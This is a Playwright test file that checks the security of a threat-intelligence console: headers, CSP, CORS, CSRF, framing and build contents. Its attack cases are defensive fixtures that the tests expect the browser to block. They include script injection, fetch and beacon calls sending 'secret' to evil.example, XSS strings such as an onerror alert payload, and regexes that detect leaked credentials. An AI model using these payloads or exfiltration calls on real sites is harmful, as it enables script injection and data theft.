import { readFileSync, readdirSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { extname, join, relative, resolve } from "node:path";

import type { APIResponse, Page } from "@playwright/test";

import { deleteViaApi, fetchIndicators, fetchOverview } from "./api";
import { expect, test } from "./fixtures";
import { openInvestigate } from "./open";
import { escapeRegExp, must } from "./text";

/**
 * The security promises of the shipped console, checked against what ships: the headers nginx
 * sends, the nginx.conf that sends them, the HTML and bundle the build produces, the API's
 * answers to hostile requests, and the browser enforcing the policy against real attacks.
 * What the pages do with hostile data is in untrusted-data.spec.ts.
 *
 * The browser tests run behind a small Node stand-in for nginx that reads its headers out of
 * nginx.conf (see e2e/harness/serve-dist.ts), so the policy under test is the policy that ships;
 * the text-level checks below cover the parts of nginx.conf the stand-in cannot exercise.
 */

const FRONTEND_DIR = resolve(import.meta.dirname, "..");
const DIST_DIR = join(FRONTEND_DIR, "dist");
const NO_SUCH_ID = "00000000-0000-4000-8000-000000000000";
const EVIL_ORIGIN = "https://evil.example";

type Policy = Record<string, string[]>;

/** The Content-Security-Policy in nginx.conf, one entry per directive. Anything more is a regression. */
const POLICY: Readonly<Policy> = {
  "default-src": ["'self'"],
  "script-src": ["'self'"],
  "style-src": ["'self'"],
  "img-src": ["'self'", "data:"],
  "font-src": ["'self'"],
  "connect-src": ["'self'"],
  "object-src": ["'none'"],
  "base-uri": ["'self'"],
  "form-action": ["'self'"],
  "frame-ancestors": ["'none'"],
};

const SIMPLE_HEADERS: Readonly<Record<string, string>> = {
  "x-content-type-options": "nosniff",
  "x-frame-options": "DENY",
  "referrer-policy": "no-referrer",
  "permissions-policy": "camera=(), microphone=(), geolocation=()",
  "cross-origin-opener-policy": "same-origin",
};

/** Every value a response carries for the header, so a duplicated header is visible. */
function headerValues(response: APIResponse, name: string): string[] {
  return response
    .headersArray()
    .filter((header) => header.name.toLowerCase() === name)
    .map((header) => header.value);
}

function parsePolicy(value: string): Policy {
  const policy: Policy = {};
  for (const part of value.split(";")) {
    const [directive, ...sources] = part.trim().split(/\s+/);
    if (directive) policy[directive] = sources;
  }
  return policy;
}

function expectSecurityHeaders(response: APIResponse): void {
  for (const [name, value] of Object.entries(SIMPLE_HEADERS)) {
    expect(headerValues(response, name), name).toEqual([value]);
  }
  const policies = headerValues(response, "content-security-policy");
  expect(policies, "content-security-policy").toHaveLength(1);
  expect(parsePolicy(must(policies[0]))).toEqual(POLICY);
}

test.describe("response headers", () => {
  const targets = [
    { name: "the console page", path: "/", status: 200, api: false },
    { name: "a deep link into the console", path: `/indicators/${NO_SUCH_ID}`, status: 200, api: false },
    { name: "a page that does not exist", path: "/no/such/page", status: 200, api: false },
    { name: "a build file that does not exist", path: "/assets/missing.js", status: 404, api: false },
    { name: "an API answer", path: "/api/v1/me", status: 200, api: true },
    { name: "an API error", path: "/api/v1/no-such-route", status: 404, api: true },
    { name: "the health check", path: "/health", status: 200, api: true },
  ] as const;

  for (const target of targets) {
    test(`${target.name} carries every security header exactly once`, async ({ request }) => {
      const response = await request.get(target.path);
      expect(response.status()).toBe(target.status);
      expectSecurityHeaders(response);
      // Answers about indicators are never kept by a browser or a proxy.
      if (target.api) expect(headerValues(response, "cache-control")).toEqual(["no-store"]);
    });
  }

  test("a built script carries them too and is served as JavaScript", async ({ request }) => {
    const html = await (await request.get("/")).text();
    const path = must(/<script[^>]+src="(\/assets\/[^"]+\.js)"/.exec(html)?.[1], "the built script");
    const response = await request.get(path);
    expect(response.status()).toBe(200);
    expect(headerValues(response, "content-type")[0]).toMatch(/javascript/);
    expectSecurityHeaders(response);
  });

  test("the policy allows nothing but the console's own origin", async ({ request }) => {
    const policy = parsePolicy(must(headerValues(await request.get("/"), "content-security-policy")[0]));
    for (const [directive, sources] of Object.entries(policy)) {
      for (const source of sources) {
        const allowed = source === "'self'" || source === "'none'" || (source === "data:" && directive === "img-src");
        expect(allowed, `${directive} allows ${source}`).toBe(true);
      }
    }
    expect(Object.keys(policy), "directives that fall back to default-src").toContain("default-src");
  });
});

interface Directive {
  name: string;
  args: string;
  /** The `location` the directive sits in, or null when it belongs to the server itself. */
  location: string | null;
}

/** The directives of nginx.conf, which is a flat list of simple directives and location blocks. */
function readNginx(): Directive[] {
  const config = readFileSync(join(FRONTEND_DIR, "nginx.conf"), "utf8");
  const directives: Directive[] = [];
  const open: string[] = [];
  for (const raw of config.split(/\r?\n/)) {
    const line = raw.replace(/#.*$/, "").trim();
    if (line === "") continue;
    if (line.endsWith("{")) {
      open.push(line.slice(0, -1).trim());
      continue;
    }
    if (line === "}") {
      open.pop();
      continue;
    }
    const match = /^(\S+)\s*(.*);$/.exec(line);
    if (!match) throw new Error(`nginx.conf has a line this test cannot read: ${line}`);
    directives.push({
      name: must(match[1]),
      args: match[2] ?? "",
      location: open.find((block) => block.startsWith("location")) ?? null,
    });
  }
  return directives;
}

test.describe("nginx.conf", () => {
  const directives = readNginx();
  const named = (name: string): Directive[] => directives.filter((directive) => directive.name === name);

  test("declares the six security headers once, at server level, on every response", () => {
    const headers = named("add_header");
    expect(headers.map((header) => header.args.split(" ")[0]?.toLowerCase()).sort()).toEqual(
      [
        "content-security-policy",
        "cross-origin-opener-policy",
        "permissions-policy",
        "referrer-policy",
        "x-content-type-options",
        "x-frame-options",
      ],
    );
    for (const header of headers) {
      expect(header.args.endsWith(" always"), `${header.args} must be sent on errors too`).toBe(true);
      // nginx drops every inherited add_header in a location that declares one of its own.
      expect(header.location, `${header.args} is inside a location`).toBeNull();
    }
  });

  test("hides the server version and limits request bodies", () => {
    expect(named("server_tokens").map((directive) => directive.args)).toEqual(["off"]);
    expect(named("client_max_body_size").map((directive) => directive.args)).toEqual(["64k"]);
  });

  test("compresses only the static build files, never API answers", () => {
    const compression = directives.filter((directive) => directive.name.startsWith("gzip"));
    expect(compression.length).toBeGreaterThan(0);
    expect(compression.map((directive) => directive.location)).toEqual(compression.map(() => "location /assets/"));
  });

  test("hands only the API and the health checks to the backend", () => {
    // e2e/harness/serve-dist.ts proxies the same paths; change both together.
    const proxies = named("proxy_pass");
    expect(proxies).toHaveLength(1);
    expect(proxies[0]?.location).toBe("location ~ ^/(?:api/|health$|ready$)");
    const hidden = named("proxy_hide_header").map((directive) => directive.args);
    expect(hidden.sort()).toEqual(["Referrer-Policy", "X-Content-Type-Options", "X-Frame-Options"]);
  });

  test("answers a missing build file with a 404 instead of the app", () => {
    const assets = directives.filter((directive) => directive.location === "location /assets/");
    expect(assets.find((directive) => directive.name === "try_files")?.args).toBe("$uri =404");
  });
});

test.describe("the served page", () => {
  test("loads only its own scripts and has no inline code to inject into", async ({ request }) => {
    const html = await (await request.get("/")).text();
    const scripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)];
    expect(scripts.length).toBeGreaterThan(0);
    for (const [, attributes = "", body = ""] of scripts) {
      expect(attributes).toMatch(/\bsrc="\/assets\/[^"]+\.js"/);
      expect(body.trim(), "inline script").toBe("");
    }
    expect(html, "inline style element").not.toMatch(/<style\b/i);
    expect(html, "inline style attribute").not.toMatch(/\sstyle\s*=/i);
    expect(html, "inline event handler").not.toMatch(/\son[a-z]+\s*=/i);
  });

  test("points every resource at its own origin", async ({ request }) => {
    const html = await (await request.get("/")).text();
    expect(html).not.toMatch(/\b(?:src|href|action|srcset|data)\s*=\s*["']?(?:[a-z][a-z0-9+.-]*:)?\/\//i);
  });

  test("tells the browser to send no referrer and has one place to mount", async ({ request }) => {
    const html = await (await request.get("/")).text();
    expect(html).toMatch(/<meta\s+name="referrer"\s+content="no-referrer"\s*\/?>/i);
    expect(html.match(/\bid="root"/g)).toHaveLength(1);
  });
});

test.describe("the browser enforces the policy", () => {
  /** What one attack does in the page; the policy must stop it and say which directive did. */
  interface Attack {
    name: string;
    /** The violated directive Chromium reports. */
    directive: string;
    run: (page: Page) => Promise<unknown>;
  }

  async function expectPageStillShown(page: Page): Promise<void> {
    expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe("none");
  }

  const ATTACKS: readonly Attack[] = [
    {
      name: "an injected inline script",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const script = document.createElement("script");
          script.textContent = "window.__pwned = 'inline script'";
          document.body.append(script);
        }),
    },
    {
      name: "an inline event handler",
      directive: "script-src-attr",
      run: (page) =>
        page.evaluate(() => {
          const button = document.createElement("button");
          button.setAttribute("onclick", "window.__pwned = 'inline handler'");
          document.body.append(button);
          button.click();
        }),
    },
    {
      name: "a javascript: link",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const link = document.createElement("a");
          link.href = "javascript:window.__pwned = 'javascript link'";
          document.body.append(link);
          link.click();
        }),
    },
    {
      name: "an inline style attribute",
      directive: "style-src-attr",
      run: async (page) => {
        await page.evaluate(() => document.body.setAttribute("style", "display: none"));
        await expectPageStillShown(page);
      },
    },
    {
      name: "an injected style element",
      directive: "style-src-elem",
      run: async (page) => {
        await page.evaluate(() => {
          const style = document.createElement("style");
          style.textContent = "body { display: none !important }";
          document.head.append(style);
        });
        await expectPageStillShown(page);
      },
    },
    {
      name: "a base tag that would redirect every relative URL",
      directive: "base-uri",
      run: async (page) => {
        const before = await page.evaluate(() => document.baseURI);
        await page.evaluate(() => {
          const base = document.createElement("base");
          base.href = "http://evil.example/";
          document.head.prepend(base);
        });
        expect(await page.evaluate(() => document.baseURI)).toBe(before);
      },
    },
    {
      name: "a script from another site",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const script = document.createElement("script");
          script.src = "http://evil.example/steal.js";
          document.head.append(script);
        }),
    },
    {
      name: "a data: script",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const script = document.createElement("script");
          script.src = "data:text/javascript,window.__pwned = 'data script'";
          document.head.append(script);
        }),
    },
    {
      name: "a blob: script",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const script = document.createElement("script");
          script.src = URL.createObjectURL(new Blob(["window.__pwned = 'blob script'"], { type: "text/javascript" }));
          document.head.append(script);
        }),
    },
    {
      name: "a module imported from another site",
      directive: "script-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const url = "http://evil.example/module.js";
          return import(url).then(
            () => "loaded",
            () => "refused",
          );
        }),
    },
    {
      name: "a worker built from a blob",
      directive: "worker-src",
      run: (page) =>
        page.evaluate(() => {
          try {
            new Worker(URL.createObjectURL(new Blob(["self.postMessage(1)"], { type: "text/javascript" })));
          } catch {
            // Some browsers refuse at construction instead of reporting; the violation is the same.
          }
        }),
    },
    {
      name: "an image beacon to another site",
      directive: "img-src",
      run: (page) =>
        page.evaluate(() => {
          new Image().src = "http://evil.example/pixel.png?stolen=1";
        }),
    },
    {
      name: "a stylesheet from another site",
      directive: "style-src-elem",
      run: (page) =>
        page.evaluate(() => {
          const link = document.createElement("link");
          link.rel = "stylesheet";
          link.href = "http://evil.example/theme.css";
          document.head.append(link);
        }),
    },
    {
      name: "a fetch to another site",
      directive: "connect-src",
      run: async (page) => {
        const outcome = await page.evaluate(() =>
          fetch("http://evil.example/steal", { method: "POST", body: "secret" }).then(
            () => "sent",
            () => "refused",
          ),
        );
        expect(outcome).toBe("refused");
      },
    },
    {
      name: "a WebSocket to another site",
      directive: "connect-src",
      run: (page) =>
        page.evaluate(
          () =>
            new Promise<void>((done) => {
              try {
                const socket = new WebSocket("ws://evil.example/socket");
                socket.onerror = () => done();
                socket.onopen = () => done();
              } catch {
                done();
              }
            }),
        ),
    },
    {
      name: "a beacon to another site",
      directive: "connect-src",
      run: (page) => page.evaluate(() => navigator.sendBeacon("http://evil.example/beacon", "secret")),
    },
    {
      name: "a form posted to another site",
      directive: "form-action",
      run: async (page) => {
        const before = page.url();
        await page.evaluate(() => {
          const form = document.createElement("form");
          form.method = "post";
          form.action = "http://evil.example/collect";
          document.body.append(form);
          form.submit();
        });
        expect(page.url()).toBe(before);
      },
    },
    {
      name: "an object from another site",
      directive: "object-src",
      run: (page) =>
        page.evaluate(() => {
          const object = document.createElement("object");
          object.data = "http://evil.example/plugin.swf";
          document.body.append(object);
        }),
    },
    {
      name: "an embed from another site",
      directive: "object-src",
      run: (page) =>
        page.evaluate(() => {
          const embed = document.createElement("embed");
          embed.src = "http://evil.example/plugin.swf";
          document.body.append(embed);
        }),
    },
    {
      name: "a frame of another site",
      directive: "frame-src",
      run: (page) =>
        page.evaluate(() => {
          const frame = document.createElement("iframe");
          frame.src = "http://evil.example/phish";
          document.body.append(frame);
        }),
    },
  ];

  for (const attack of ATTACKS) {
    test(`blocks ${attack.name}`, async ({ page, guard }) => {
      guard.expectCspViolations();
      guard.expectConsole(/Content Security Policy|Refused to|violates the following/i);
      // Cut off by the browser before any request: only the failure is seen, never the traffic.
      guard.expectRequestFailure(/evil\.example|^blob:|^data:/);
      const reached: string[] = [];
      await page.route(/evil\.example/, (route) => {
        reached.push(route.request().url());
        return route.abort();
      });
      await openInvestigate(page);

      await attack.run(page);

      await expect
        .poll(() => guard.cspViolations.some((violation) => violation.startsWith(`${attack.directive}:`)), {
          message: `the browser should report ${attack.directive}; it reported ${JSON.stringify(guard.cspViolations)}`,
        })
        .toBe(true);
      expect(await page.evaluate(() => Reflect.get(window, "__pwned") as unknown)).toBeUndefined();
      expect(reached, "requests that got as far as the network").toEqual([]);
    });
  }

  test("refuses eval, new Function and string timers even from the app's own script file", async ({
    page,
    guard,
  }) => {
    guard.expectCspViolations();
    guard.expectConsole(/Content Security Policy|unsafe-eval/i);
    // A script on the console's own origin is allowed to run, which makes it a fair test of the
    // one thing the policy still has to stop: turning text into code.
    await page.route(/\/attacker\.js$/, (route) =>
      route.fulfill({
        contentType: "text/javascript",
        body: `
          const outcome = {};
          const attempts = {
            eval: () => eval("window.__pwned = 'eval'"),
            newFunction: () => new Function("window.__pwned = 'new Function'")(),
            stringTimer: () => setTimeout("window.__pwned = 'string timer'", 0),
          };
          for (const [name, attempt] of Object.entries(attempts)) {
            try { attempt(); outcome[name] = "returned"; } catch (error) { outcome[name] = error.name; }
          }
          window.__attacker = outcome;
        `,
      }),
    );
    await openInvestigate(page);
    await page.evaluate(() => {
      const script = document.createElement("script");
      script.src = "/attacker.js";
      document.head.append(script);
    });

    await expect
      .poll(() => page.evaluate(() => Reflect.get(window, "__attacker") as unknown), { message: "the script should run" })
      .toMatchObject({ eval: "EvalError", newFunction: "EvalError" });
    // The string timer fires within a tick if it is going to fire at all.
    await page.evaluate(() => new Promise((done) => setTimeout(done, 250)));
    expect(await page.evaluate(() => Reflect.get(window, "__pwned") as unknown)).toBeUndefined();
    const evalViolations = guard.cspViolations.filter((violation) => violation.startsWith("script-src: eval"));
    expect(evalViolations.length, JSON.stringify(guard.cspViolations)).toBeGreaterThanOrEqual(3);
  });
});

interface Framer {
  /** Where the other site lives. */
  origin: string;
  close: () => Promise<void>;
}

/**
 * A second web server on its own port, standing in for another site that wants to frame the
 * console. It also frames an ordinary page on a third origin, to show that framing works here
 * and that the console is the one thing refusing.
 */
async function startFramer(appUrl: string): Promise<Framer> {
  const server = createServer((request, response) => {
    const { port } = server.address() as AddressInfo;
    response.setHeader("content-type", "text/html; charset=utf-8");
    if (request.url === "/plain") {
      response.end('<!doctype html><title>plain</title><p id="plain">A page that allows framing</p>');
      return;
    }
    response.end(
      "<!doctype html><title>another site</title>" +
        `<iframe id="console" title="console" src="${appUrl}/"></iframe>` +
        `<iframe id="control" title="control" src="http://localhost:${port}/plain"></iframe>`,
    );
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", done));
  const { port } = server.address() as AddressInfo;
  return {
    origin: `http://127.0.0.1:${port}`,
    close: () =>
      new Promise<void>((done) => {
        server.close(() => done());
        server.closeAllConnections();
      }),
  };
}

test("another site cannot put the console in a frame", async ({ page, baseURL, guard }) => {
  const app = must(baseURL);
  guard.expectConsole(/frame-ancestors|X-Frame-Options/i);
  guard.expectRequestFailure(new RegExp(`^${escapeRegExp(app)}/$`));
  const failures: string[] = [];
  page.on("requestfailed", (request) => failures.push(`${request.url()} ${request.failure()?.errorText ?? ""}`));

  const framer = await startFramer(app);
  try {
    await page.goto(`${framer.origin}/`);
    // The control: a page on yet another origin does load in a frame, so the setup is sound.
    await expect(page.frameLocator("#control").locator("#plain")).toBeVisible();
    await expect.poll(() => failures, { message: "the browser should refuse the console frame" }).toContain(
      `${app}/ net::ERR_BLOCKED_BY_RESPONSE`,
    );
    const addresses = page.frames().map((frame) => frame.url());
    expect(addresses.filter((address) => address.startsWith(app))).toEqual([]);
    expect(addresses.some((address) => address.startsWith("chrome-error:"))).toBe(true);
  } finally {
    await framer.close();
  }
});

test.describe("the API behind the console", () => {
  test("never hands out cross-origin access", async ({ request }) => {
    const simple = await request.get("/api/v1/me", { headers: { origin: EVIL_ORIGIN } });
    expect(simple.status()).toBe(200);
    expect(headerValues(simple, "access-control-allow-origin")).toEqual([]);

    const preflight = await request.fetch("/api/v1/intel/investigate", {
      method: "OPTIONS",
      headers: {
        origin: EVIL_ORIGIN,
        "access-control-request-method": "POST",
        "access-control-request-headers": "content-type",
      },
    });
    expect(headerValues(preflight, "access-control-allow-origin")).toEqual([]);
    expect(headerValues(preflight, "access-control-allow-credentials")).toEqual([]);
  });

  test("cannot be made to start a lookup by a form on another site", async ({ request }) => {
    const before = (await fetchOverview(request)).kpis.lookups_24h;
    const indicator = "8.8.8.8";
    // A page on another site can send these without asking the browser's permission first.
    const asText = await request.post("/api/v1/intel/investigate", {
      headers: { "content-type": "text/plain", origin: EVIL_ORIGIN },
      data: JSON.stringify({ indicator, refresh: true }),
    });
    const asForm = await request.post("/api/v1/intel/investigate", {
      headers: { origin: EVIL_ORIGIN },
      form: { indicator, refresh: "true" },
    });
    expect([asText.status(), asForm.status()]).toEqual([422, 422]);
    expect((await fetchOverview(request)).kpis.lookups_24h).toBe(before);
  });

  test("offers no way to change a stored indicator, or to delete more than it is told to", async ({ request }) => {
    const record = `/api/v1/intel/indicators/${NO_SUCH_ID}`;
    const attempts = [
      await request.put(record, { data: {} }),
      await request.patch(record, { data: {} }),
      await request.post("/api/v1/intel/indicators", { data: {} }),
      // Deletion is by id: no method removes a whole collection, or whatever a filter matches.
      await request.delete("/api/v1/intel/indicators"),
      await request.delete("/api/v1/intel/indicators?q=e2e"),
    ];
    expect(attempts.map((response) => response.status())).toEqual([405, 405, 405, 405, 405]);
  });

  test("deletes only the indicators it is given by id", async ({ request, seed }) => {
    const { search, items } = await seed(3);
    const id = must(items[0], "an indicator").indicator_id;
    const bulk = "/api/v1/intel/indicators/bulk-delete";
    const refused = [
      await request.post(bulk, { data: { q: search } }),
      await request.post(bulk, { data: { all: true } }),
      await request.post(bulk, { data: { indicator_ids: [id], q: "" } }),
      await request.post(bulk, { data: { indicator_ids: [] } }),
      await request.post(bulk, { data: { indicator_ids: ["not-a-uuid"] } }),
      await request.post(bulk, { data: { indicator_ids: Array.from({ length: 101 }, () => NO_SUCH_ID) } }),
      await request.delete(`/api/v1/intel/indicators/not-a-uuid`),
    ];
    expect(refused.map((response) => response.status())).toEqual([422, 422, 422, 422, 422, 422, 422]);
    expect((await fetchIndicators(request, { q: search })).total, "nothing was deleted").toBe(3);

    const result = await deleteViaApi(request, [id]);
    expect(result.deleted).toEqual([id]);
    expect((await fetchIndicators(request, { q: search })).total, "only the named indicator went").toBe(2);
  });

  test("cannot be made to delete an indicator by a page on another site", async ({ request, seed }) => {
    const { search, items } = await seed(1);
    const id = must(items[0], "an indicator").indicator_id;
    const bulk = "/api/v1/intel/indicators/bulk-delete";
    // A page on another site can send these without asking the browser's permission first.
    const asText = await request.post(bulk, {
      headers: { "content-type": "text/plain", origin: EVIL_ORIGIN },
      data: JSON.stringify({ indicator_ids: [id] }),
    });
    const asForm = await request.post(bulk, { headers: { origin: EVIL_ORIGIN }, form: { indicator_ids: id } });
    expect([asText.status(), asForm.status()]).toEqual([422, 422]);

    // A DELETE, or a JSON body, needs the browser's permission first, and the API never gives it.
    const preflights = [
      await request.fetch(`/api/v1/intel/indicators/${id}`, {
        method: "OPTIONS",
        headers: { origin: EVIL_ORIGIN, "access-control-request-method": "DELETE" },
      }),
      await request.fetch(bulk, {
        method: "OPTIONS",
        headers: {
          origin: EVIL_ORIGIN,
          "access-control-request-method": "POST",
          "access-control-request-headers": "content-type",
        },
      }),
    ];
    for (const preflight of preflights) {
      expect(headerValues(preflight, "access-control-allow-origin")).toEqual([]);
      expect(headerValues(preflight, "access-control-allow-methods")).toEqual([]);
    }
    expect((await fetchIndicators(request, { q: search })).total, "the indicator is still stored").toBe(1);
  });

  test("explains a refusal in a small envelope that leaks no internals and echoes nothing back", async ({ request }) => {
    // No slash, which would make it a different path and an ordinary 404.
    const hostile = "<img src=x onerror=alert(1)>";
    const refusals = [
      {
        response: await request.post("/api/v1/intel/investigate", { data: { indicator: hostile, refresh: false } }),
        status: 422,
        code: "validation_error",
      },
      {
        response: await request.post("/api/v1/intel/investigate", {
          headers: { "content-type": "application/json" },
          data: `{ "indicator": ${hostile}`,
        }),
        status: 422,
        code: "validation_error",
      },
      { response: await request.get(`/api/v1/intel/indicators/${hostile}`), status: 422, code: "validation_error" },
      {
        response: await request.get(`/api/v1/intel/indicators?q=${encodeURIComponent(hostile)}&limit=-1&classification=${hostile}`),
        status: 422,
        code: "validation_error",
      },
      { response: await request.get("/api/v1/no-such-route"), status: 404, code: "not_found" },
      { response: await request.delete("/api/v1/intel/indicators"), status: 405, code: "method_not_allowed" },
    ];
    for (const { response, status, code } of refusals) {
      const body = await response.text();
      expect(response.status(), body).toBe(status);
      const envelope = JSON.parse(body) as { error?: { code?: unknown; message?: unknown; correlation_id?: unknown } };
      expect(envelope.error?.code).toBe(code);
      expect(typeof envelope.error?.message).toBe("string");
      expect(typeof envelope.error?.correlation_id).toBe("string");
      expect(body, "an echo of the hostile input").not.toMatch(/<img|onerror|alert\(/i);
      expect(body, "internals in an error").not.toMatch(
        /Traceback|File "|site-packages|sqlalchemy|psycopg|sqlite|\bSELECT\b|\bINSERT\b|\.py\b/i,
      );
    }
  });

  test("keeps a caller from choosing the correlation ID the server logs", async ({ request }) => {
    const hostile = await request.get("/api/v1/me", { headers: { "x-correlation-id": "bad id <script>alert(1)</script>" } });
    expect(headerValues(hostile, "x-correlation-id")[0]).toMatch(/^[0-9a-f]{32}$/);

    const tidy = await request.get("/api/v1/me", { headers: { "x-correlation-id": "e2e-trace-0001" } });
    expect(headerValues(tidy, "x-correlation-id")).toEqual(["e2e-trace-0001"]);
  });
});

test.describe("the build output", () => {
  function listFiles(directory: string): string[] {
    return readdirSync(directory, { withFileTypes: true }).flatMap((entry) =>
      entry.isDirectory() ? listFiles(join(directory, entry.name)) : [join(directory, entry.name)],
    );
  }

  const files = listFiles(DIST_DIR);
  const code = files.filter((file) => [".js", ".css"].includes(extname(file)));
  const read = (file: string): string => readFileSync(file, "utf8");

  test("holds only the files a browser needs", () => {
    const allowed = new Set([".html", ".svg", ".js", ".css", ".woff2"]);
    const unexpected = files.map((file) => relative(DIST_DIR, file)).filter((file) => !allowed.has(extname(file)));
    expect(unexpected, "files that should not be served").toEqual([]);
    expect(code.length).toBeGreaterThan(1);
  });

  test("gives away no source through source maps", () => {
    for (const file of code) {
      expect(read(file), relative(DIST_DIR, file)).not.toMatch(/sourceMappingURL/);
    }
  });

  test("contains no credentials", () => {
    const secrets = [
      /AKIA[0-9A-Z]{16}/,
      /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
      /ghp_[A-Za-z0-9]{36}/,
      /xox[baprs]-[A-Za-z0-9-]{10,}/,
      /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/,
    ];
    for (const file of code) {
      const text = read(file);
      for (const secret of secrets) expect(text, `${relative(DIST_DIR, file)} matches ${secret}`).not.toMatch(secret);
    }
  });

  test("names no host except the few it documents", () => {
    // Any other host in the bundle is a new place the console might talk to, and needs a look.
    const known = new Map([
      ["www.w3.org", "SVG and MathML namespaces"],
      ["attack.mitre.org", "technique links"],
      ["otx.alienvault.com", "pulse links"],
      ["example.com", "the example indicator"],
      ["react.dev", "React error pages"],
      ["reactrouter.com", "React Router error pages"],
      ["github.com", "a comment in a dependency"],
      ["localhost", "URL parsing in dependencies"],
    ]);
    const hosts = new Set<string>();
    for (const file of code) {
      for (const match of read(file).matchAll(/\b(?:https?|wss?):\/\/([a-z0-9.-]+)/gi)) hosts.add(must(match[1]).toLowerCase());
    }
    expect([...hosts].filter((host) => !known.has(host)).sort()).toEqual([]);
  });
});
